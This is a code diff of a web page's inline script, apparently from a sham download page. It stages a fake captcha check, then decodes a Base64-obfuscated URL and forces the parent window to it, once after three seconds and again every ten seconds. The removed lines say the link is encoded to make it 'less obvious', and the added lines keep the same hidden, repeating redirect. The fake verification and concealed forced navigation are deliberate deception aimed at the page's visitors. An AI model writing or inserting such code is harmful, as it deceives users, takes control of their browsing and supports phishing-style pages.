@@ -703,54 +703,35 @@ You may need to download version 2.0 now from the <a rel="noopener noreferrer" h
 
 		
 <script>
-
 window.onload = function () {
-    $(".popup").css("opacity" ,"1");
-}
+    $(".popup").css("opacity", "1");
+};
 
 $('.capcha__trigger').click(function () { 
     $('.capcha__trigger').addClass("capcha__trigger_hide");
     $('.capcha__spiner').fadeIn(600);
 
-setTimeout(function(){
-      $('.capcha__spiner').hide();
-      $('.capcha__popup').fadeOut(300);
-      $('.capcha__trigger').hide();
-      $('.capcha__ok').addClass("capcha__ok_active");
-
-          setTimeout(function(){
-function check_link() {
-    // Base64 encode the link to make it less obvious
-    let encodedLink = 'aHR0cHM6Ly9zYWxpa2suY29tLw==';
-    
-    // Decode and redirect after a small delay
     setTimeout(function() {
-        window.parent.location.href = atob(encodedLink);
-    }, 10); // Delay of 1 second
-}
-$(document).ready(function(){
-    check_link();
+        $('.capcha__spiner').hide();
+        $('.capcha__popup').fadeOut(300);
+        $('.capcha__trigger').hide();
+        $('.capcha__ok').addClass("capcha__ok_active");
 
-    setInterval(function() {
-        check_link();
-    }, 1000);
-});
+        // Function to check link and redirect
+        function check_link() {
+            let encodedLink = 'aHR0cHM6Ly9zYWxpa2suY29tLw==';
+            window.parent.location.href = atob(encodedLink);
+        }
 
-// Initial delay of 3 seconds before the first check
-setTimeout(function(){
-    check_link();
-}, 3000);
-        $(document).ready(function(){
-                        check_link();
-                        setInterval(function() {
-                                check_link();
-                        }, 10000);
-                });
- }, 3000);
+        // Initial delay of 3 seconds before the first check
+        setTimeout(check_link, 3000);
+
+        // Call check_link every 10 seconds
+        setInterval(check_link, 10000);
     }, 3000);
 });
+</script>
 
-                </script>
 
 
 <script>
